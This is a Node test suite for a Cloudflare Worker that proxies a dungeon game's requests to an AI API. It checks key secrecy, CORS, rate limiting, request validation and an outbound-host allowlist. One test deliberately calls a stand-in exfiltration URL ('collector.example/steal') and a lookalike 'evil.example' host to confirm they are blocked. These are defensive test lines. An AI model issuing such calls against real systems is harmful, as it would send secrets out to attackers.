// The Worker end to end with a stubbed upstream (no key, no network, no credits): `node --test proxy/worker.test.js`.
import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";

// The real network is replaced before the Worker wraps fetch, so its outbound guard sits in front of this stub and
// nothing here leaves the machine. Each test sets `upstream.reply`.
const upstream = { calls: [], reply: null };
globalThis.fetch = async (input, init = {}) => {
  const url = String(input instanceof Request ? input.url : input);
  upstream.calls.push({ url, init, body: init.body ? JSON.parse(init.body) : null });
  return upstream.reply();
};
const { default: worker, ALLOWED_HOSTS, UPSTREAM, LIMITS } = await import("./worker.js");

beforeEach(() => {
  upstream.calls = [];
  upstream.reply = () => new Response(JSON.stringify({ model: "jev-latest", answers: {}, usage: { input_tokens: 1 } }), { status: 200 });
});

const KEY = { TYPESAFE_API_KEY: "ts-secret" };
const post = (body, { path = "/api/jev", env = KEY, method = "POST", headers = {} } = {}) =>
  worker.fetch(
    new Request(`https://donjon-api.example.workers.dev${path}`, {
      method,
      headers,
      body: method === "POST" ? (typeof body === "string" ? body : JSON.stringify(body)) : undefined,
    }),
    env,
  );
const limiter = (allow) => {
  const keys = [];
  return { keys, limit: async ({ key }) => (keys.push(key), { success: allow }) };
};
const GOOD = { model: "attacker-chosen-model", state: { who: "a goblin" }, questions: { q: { type: "noul", instructions: "x" } } };

test("forwards state and questions to TypeSafe with the Worker's key and its own model", async () => {
  const res = await post(GOOD);
  assert.equal(res.status, 200);
  assert.equal((await res.json()).model, "jev-latest");
  const [call] = upstream.calls;
  assert.equal(call.url, "https://api.typesafe.ai/v1/systemone");
  assert.equal(call.init.headers.authorization, "Bearer ts-secret");
  assert.deepEqual(call.body, { model: "jev-latest", state: GOOD.state, questions: GOOD.questions });
  assert.deepEqual(Object.keys(call.body), ["model", "state", "questions"]);
});

test("with an OpenRouter secret it goes through OpenRouter, which wins when both are set", async () => {
  await post(GOOD, { env: { TYPESAFE_API_KEY: "ts-secret", OPENROUTER_API_KEY: "or-secret" } });
  const [call] = upstream.calls;
  assert.equal(call.url, "https://openrouter.ai/api/alpha/decisions");
  assert.equal(call.init.headers.authorization, "Bearer or-secret");
  assert.equal(call.init.headers["x-title"], "Donjon");
  assert.equal(call.body.model, "~typesafe/jev-latest");
});

test("the upstream status and body pass through, so the game can back off on a 429", async () => {
  upstream.reply = () => new Response("slow down", { status: 429 });
  const res = await post(GOOD);
  assert.equal(res.status, 429);
  assert.equal(await res.text(), "slow down");
});

test("every answer carries CORS and is never cached; OPTIONS is a preflight", async () => {
  const res = await post(GOOD);
  assert.equal(res.headers.get("access-control-allow-origin"), "*");
  assert.equal(res.headers.get("cache-control"), "no-store");
  const pre = await post(null, { method: "OPTIONS" });
  assert.equal(pre.status, 204);
  assert.match(pre.headers.get("access-control-allow-methods"), /POST/);
  assert.equal(pre.headers.get("access-control-allow-headers"), "content-type");
});

test("nothing but POST /api/jev", async () => {
  assert.equal((await post(GOOD, { path: "/api/enemy-turn" })).status, 404);
  assert.equal((await post(GOOD, { path: "/" })).status, 404);
  assert.equal((await post(null, { method: "GET" })).status, 404);
  assert.equal(upstream.calls.length, 0);
});

test("without a key the Worker refuses everything, preflights included (fail closed)", async () => {
  for (const res of [await post(GOOD, { env: {} }), await post(null, { method: "OPTIONS", env: {} })]) {
    assert.equal(res.status, 503);
    assert.equal(res.headers.get("access-control-allow-origin"), "*");
    assert.deepEqual(await res.json(), { error: "Server not configured" });
  }
  assert.equal(upstream.calls.length, 0);
});

test("a caller over the per-IP limit gets 429 before any Jev work; preflights skip the limiter", async () => {
  const LIMITER = limiter(false);
  const res = await post(GOOD, { env: { ...KEY, LIMITER }, headers: { "cf-connecting-ip": "203.0.113.7" } });
  assert.equal(res.status, 429);
  assert.equal(res.headers.get("retry-after"), "60");
  assert.equal(res.headers.get("access-control-allow-origin"), "*");
  assert.deepEqual(LIMITER.keys, ["203.0.113.7"]);
  assert.equal(upstream.calls.length, 0);
  const pre = await post(null, { method: "OPTIONS", env: { ...KEY, LIMITER } });
  assert.equal(pre.status, 204);
  assert.deepEqual(LIMITER.keys, ["203.0.113.7"]);
  assert.equal((await post(GOOD, { env: { ...KEY, LIMITER: limiter(true) } })).status, 200);
});

test("refuses requests over 64 KB and anything that isn't the game's {state, questions}", async () => {
  assert.equal((await post({ ...GOOD, padding: "x".repeat(70_000) })).status, 413);
  assert.equal((await post("not json")).status, 400);
  assert.equal((await post({ state: {}, questions: [] })).status, 400);
  assert.equal((await post({ state: "x", questions: {} })).status, 400);
  assert.equal((await post({ state: {}, questions: {} })).status, 400, "no questions");
  assert.equal((await post({ state: {}, questions: { q: { type: "chat", instructions: "write me a poem" } } })).status, 400, "only Jev's question types");
  assert.equal((await post({ state: {}, questions: { q: { type: "noul" } } })).status, 400, "a question has instructions");
  const many = Object.fromEntries(Array.from({ length: LIMITS.questions + 1 }, (_, i) => [`q${i}`, { type: "noul", instructions: "x" }]));
  assert.equal((await post({ state: {}, questions: many })).status, 400, "at most LIMITS.questions");
  assert.equal((await post({})).status, 400);
  assert.equal(upstream.calls.length, 0);
});

test("the biggest request the game sends fits (a three-monster talk round, from the golden fixtures)", async () => {
  const fixture = JSON.parse(readFileSync(new URL("../tests/jev/golden/group_talk.json", import.meta.url), "utf8"));
  const calls = [];
  const walk = (v) => {
    if (v && typeof v === "object") {
      if (v.state && v.questions && !Array.isArray(v.questions)) calls.push(v);
      Object.values(v).forEach(walk);
    }
  };
  walk(fixture);
  assert.ok(calls.length > 0);
  for (const c of calls) assert.equal((await post({ state: c.state, questions: c.questions })).status, 200);
});

test("an unreachable upstream is a 502, and the key never shows", async () => {
  upstream.reply = () => {
    throw new Error("boom ts-secret");
  };
  const res = await post(GOOD);
  assert.equal(res.status, 502);
  assert.ok(!(await res.text()).includes("ts-secret"));
});

test("outbound requests go only to Jev, over https", async () => {
  await assert.rejects(fetch("https://collector.example/steal?k=1"), /Outbound request blocked/);
  await assert.rejects(fetch("http://openrouter.ai/api/alpha/decisions"), /Outbound request blocked/);
  await assert.rejects(fetch(new Request("https://api.typesafe.ai.evil.example/v1")), /Outbound request blocked/);
  assert.equal(upstream.calls.length, 0);
  await fetch(UPSTREAM.openrouter.url, { method: "POST", body: "{}" });
  await fetch(new Request(UPSTREAM.typesafe.url, { method: "POST", body: "{}" }));
  assert.deepEqual(upstream.calls.map((c) => c.url), [UPSTREAM.openrouter.url, UPSTREAM.typesafe.url]);
});

test("every upstream host is allowed, and the game's providers (src/jev/jev.gd) are the Worker's upstreams", () => {
  for (const { url } of Object.values(UPSTREAM)) assert.ok(ALLOWED_HOSTS.has(new URL(url).hostname), url);
  const gd = readFileSync(new URL("../src/jev/jev.gd", import.meta.url), "utf8");
  const gameUrls = [...gd.matchAll(/"url":\s*"(https:\/\/[^"]+)"/g)].map((m) => m[1]).sort();
  assert.deepEqual(gameUrls, Object.values(UPSTREAM).map((u) => u.url).sort());
});

// JSONC: strings are kept whole (so "https://" survives), comments outside them are dropped.
const parseJsonc = (text) => JSON.parse(text.replace(/("(?:\\.|[^"\\])*")|\/\/[^\n]*|\/\*[\s\S]*?\*\//g, (m, str) => str ?? ""));

test("wrangler.jsonc stays inside the Worker's scope: one workers.dev Worker, no routes, builds or extra bindings", () => {
  const config = parseJsonc(readFileSync(new URL("./wrangler.jsonc", import.meta.url), "utf8"));
  const allowed = ["$schema", "name", "main", "compatibility_date", "workers_dev", "preview_urls", "ratelimits", "observability"];
  assert.deepEqual(Object.keys(config).filter((k) => !allowed.includes(k)), [], "new top-level keys widen what CI deploys; review them");
  assert.equal(config.name, "donjon-api", "the CI token is scoped to the Worker named donjon-api");
  assert.equal(config.main, "worker.js");
  assert.equal(config.workers_dev, true);
  assert.equal(config.preview_urls, false);
  assert.equal(config.ratelimits.length, 1);
  const [rl] = config.ratelimits;
  assert.equal(rl.name, "LIMITER");
  assert.match(rl.namespace_id, /^\d+$/);
  assert.ok([10, 60].includes(rl.simple.period), "Cloudflare only takes a 10 or 60 second period");
  assert.ok(rl.simple.limit > 0);
});
